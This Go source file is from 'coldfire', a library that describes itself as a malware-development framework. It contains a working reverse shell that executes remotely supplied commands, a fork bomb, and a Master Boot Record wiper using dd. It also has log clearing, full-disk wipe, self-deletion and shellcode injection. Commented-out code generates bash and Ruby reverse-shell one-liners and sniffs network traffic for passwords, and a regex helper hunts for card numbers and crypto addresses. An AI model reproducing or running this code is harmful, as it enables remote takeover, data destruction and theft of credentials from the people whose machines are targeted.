// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"
    "database/sql"

    _ "github.com/lib/pq"
	"github.com/fatih/color"
	"github.com/GeertJohan/yubigo"
    _ "github.com/go-sql-driver/mysql"
	//"github.com/secsy/goftp"
	"github.com/ztrue/tracerr"
)

var (
	Red     = color.New(color.FgRed).SprintFunc()
	Green   = color.New(color.FgGreen).SprintFunc()
	Cyan    = color.New(color.FgBlue).SprintFunc()
	Bold    = color.New(color.Bold).SprintFunc()
	Yellow  = color.New(color.FgYellow).SprintFunc()
	Magenta = color.New(color.FgMagenta).SprintFunc()
	tmpbuf []byte 
)

func handleReverse(conn net.Conn) {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
}

func getNTPTime() time.Time {
	type ntp struct {
		FirstByte, A, B, C uint8
		D, E, F            uint32
		G, H               uint64
		ReceiveTime        uint64
		J                  uint64
	}
	sock, _ := net.Dial("udp", "us.pool.ntp.org:123")
	sock.SetDeadline(time.Now().Add((2 * time.Second)))
	defer sock.Close()
	transmit := new(ntp)
	transmit.FirstByte = 0x1b
	binary.Write(sock, binary.BigEndian, transmit)
	binary.Read(sock, binary.BigEndian, transmit)
	return time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((transmit.ReceiveTime >> 32) * 1000000000)))
}

// func _sleep(seconds int, endSignal chan<- bool) {
// 	time.Sleep(time.Duration(seconds) * time.Second)
// 	endSignal <- true
// }

// PrintGood is used to print output indicating success.
func PrintGood(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] ~ %s \n", Green(t), msg)
}

// PrintInfo is used to print output containing information.
func PrintInfo(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] ~ %s\n", t, msg)
}

// PrintError is used to print output indicating failure.
func PrintError(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] ~ %s \n", Red(t), msg)
}

// PrintWarning is used to print output indicating potential failure.
func PrintWarning(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] - %s \n", Yellow(t), msg)
}

// Returns true if a file is executable
func IsFileExec(file string) bool {
	inf, err := os.Stat(file)
	Check(err)
	mode := inf.Mode()
	return mode&0111 != 0
}


// Exfiltrates data slowly from either MySQL or Postgres
func HarvestDB(ip, username, password string, port int){
	if PortscanSingle(ip, 5400){

	}
	if PortscanSingle(ip, 3306){
		db, err := sql.Open("mysql", F("%s:%s@tcp(%s:3306)/test", username, password, ip))
		Check(err)
		defer db.Close()
	}
}

// Lists remote SQL databases
func ListDB(db *sql.DB, tables bool) []string {
	res, err := db.Query("SHOW DATABASES")
	if tables {
		res, err = db.Query("SHOW TABLES")
	}
	Check(err)
	var result []string
	var table string
	for res.Next() {
    	res.Scan(&table)
    	result = append(result, table)
	}
	return result
}

// Generates a reverse shell in a given language to the current machine on arbitrary port
/*func LangRevshell(language string, port int, global bool) string {
	reverse_addr := GetLocalIP()
	if (global){
		reverse_addr = GetGlobalIP()	
	}
	rshell := ""
	switch (language){
	case "rb":
		rshell = F("require 'socket';spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))", reverse_addr, port)
	case "sh":
		rshell = F("bash -i >& /dev/tcp/%s/%d 0>&1", reverse_addr, port)
	}
	return rshell
}

// Ta funkcja wpierdala gratisa na FTP
func Gratis(ip, username, password string, port int) {
    config := goftp.Config{
        User:               username,
        Password:           password,
        ConnectionsPerHost: port,
        Timeout:            20 * time.Second,
        Logger:             os.Stderr,
    }
    connection, err := goftp.DialConfig(config, ip)
	Check(err)
	listing, err := connection.ReadDir("/")
	Check(err)
    for _, file := range listing {
        _ = file.Name()
    }
}*/

// Verifies Yubico OTP
func Yubi(id, token, otp string) bool {
	yubikey, err := yubigo.NewYubiAuth(id, token)
	Check(err)
	res, ok, err := yubikey.Verify(otp)
	if (err != nil || ! ok || res == nil) {
		return false
	}
	return true
}

// Allocates anonymous memory without using it.
func Alloc(size string) {
	tmpbuf = make([]byte, Size2Bytes(size))
}

// GenCpuLoad gives the Cpu work to do by spawning goroutines.
func GenCpuLoad(cores int, interval string, percentage int) {
	runtime.GOMAXPROCS(cores)
	unitHundresOfMicrosecond := 1000
	runMicrosecond := unitHundresOfMicrosecond * percentage
	// sleepMicrosecond := unitHundresOfMicrosecond*100 - runMicrosecond

	for i := 0; i < cores; i++ {
		go func() {
			runtime.LockOSThread()
			for {
				begin := time.Now()
				for {
					if time.Since(begin) > time.Duration(runMicrosecond)*time.Microsecond {
						break
					}
				}
			}
		}()
	}

	t, _ := time.ParseDuration(interval)
	time.Sleep(t * time.Second)
}

// ExitOnError prints a given error and then stops execution of the process.
func ExitOnError(e error) {
	if e != nil {
		PrintError(e.Error())
		os.Exit(0)
	}
}

// Basic error handilng and reporting
// Similar to exitOnError() but more verbose and does not exit
func Check(e error) {
	u, _ := GetUser()
	if e != nil {
		fmt.Println(F("I am sorry %s, I'm afraid I can't do that", u))
		tracerr.PrintSourceColor(e)
	}
}

// Wait uses a human friendly string that indicates how long a system should wait.
func Wait(interval string) {
	period_letter := string(interval[len(interval)-1])
	intr := string(interval[:len(interval)-1])
	i, _ := strconv.ParseInt(intr, 10, 64)

	var x int64

	switch period_letter {
	case "s":
		x = i
	case "m":
		x = i * 60
	case "h":
		x = i * 3600
	}

	time.Sleep(time.Duration(x) * time.Second)
}

// Forkbomb spawns goroutines in order to crash the machine.
func Forkbomb() {
	for {
		go Forkbomb()
	}
}

// Remove is used to self delete.
func Remove() {
	os.Remove(os.Args[0])
}

// CredentialsSniff is used to sniff network traffic for
// private user information.
/*func CredentialsSniff(ifac, interval string,
	collector chan string,
	words []string) error {
	ifs := []string{}
	if ifac != "all" {
		ifs = []string{ifac}
	} else {
		ifs = append(ifs, ifs...)
	}
	hits := []string{"password", "user",
		"username", "secrets", "auth"}
	for w := range words {
		word := words[w]
		hits = append(hits, word)
	}
	for h := range hits {
		hit := hits[h]
		hits = append(hits, strings.ToUpper(hit))
		hits = append(hits, strings.ToUpper(string(hit[0]))+string(hit[1:]))
	}
	var snapshot_len int32 = 1024
	var timeout time.Duration = time.Duration(IntervalToSeconds(interval)) * time.Second
	for _, i := range ifs {
		handler, err := pcap.OpenLive(i, snapshot_len, false, timeout)
		if err != nil {
			return err
		}
		defer handler.Close()
		source := gopacket.NewPacketSource(handler, handler.LinkType())
		for p := range source.Packets() {
			app_layer := p.ApplicationLayer()
			pay := app_layer.Payload()
			for h := range hits {
				hit := hits[h]
				if bytes.Contains(pay, []byte(hit)) {
					collector <- string(pay)
				}
			}
		}
	}
	return nil
}*/

// Reverse initiates a reverse shell to a given host:port.
func Reverse(host string, port int) {
	conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
	ExitOnError(err)

	for {
		handleReverse(conn)
	}
}

// BannerGrab returns a service banner string from a given port.
func BannerGrab(target string, port int) (string, error) {
	conn, err := net.DialTimeout("tcp", target+":"+strconv.Itoa(port), time.Second*10)
	if err != nil {
		return "", err
	}

	buffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(time.Second * 5))

	n, err := conn.Read(buffer)
	if err != nil {
		return "", err
	}

	banner := buffer[0:n]

	return string(banner), nil
}

// EraseMbr zeroes out the Master Boot Record.
// This is linux only, so should live in `coldfier_linux.go`
func EraseMbr(device string, partition_table bool) error {
	cmd := f("dd if=/dev/zero of=%s bs=446 count=1", device)
	if partition_table {
		cmd = f("dd if=/dev/zero of=%s bs=512 count=1", device)
	}

	_, err := CmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

// Removes logfiles within the machine.
func ClearLogs() error {
	return clearLogs()
}

// Deletes all data in the machine.
func Wipe() error {
	return wipe()
}


// Checks if a string contains valuable information through regex.
func RegexMatch(regex_type, str string) bool {
	regexes := map[string]string{
		"mail":   "^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$",
		"ip":     `(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`,
		"mac":    `^([0-9A-Fa-f]{2}[:-])/contains{5}([0-9A-Fa-f]{2})$`,
		"date":   `\d{4}-\d{2}-\d{2}`,
		"domain": `^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/\n]+)`,
		"phone":  `^(?:(?:\(?(?:00|\+)([1-4]\d\d|[1-9]\d?)\)?)?[\-\.\ \\\/]?)?((?:\(?\d{1,}\)?[\-\.\ \\\/]?){0,})(?:[\-\.\ \\\/]?(?:#|ext\.?|extension|x)[\-\.\ \\\/]?(\d+))?$`,
		"ccn":    `^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$`,
		"time":   `^([0-9]|0[0-9]|1[0-9]|2[0-3]):([0-9]|[0-5][0-9])$`,
		"crypto": `^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$`,
	}
	r := regexp.MustCompile(regexes[regex_type])
	matches := r.FindAllString(str, -1)

	return len(matches) != 0
}

// Launches live documentation of the library on port 8080 or arbitrary
func AutoDoc(port ...int) {
	docport := 8080
	if len(port) > 0 {
		docport = port[0]
	}
	CmdRun(F("godoc -http=:%d", docport))
}

// Injects a bytearray into current process and executes it
func RunShellcode(sc []byte, bg bool){
	runShellcode(sc, bg)
}
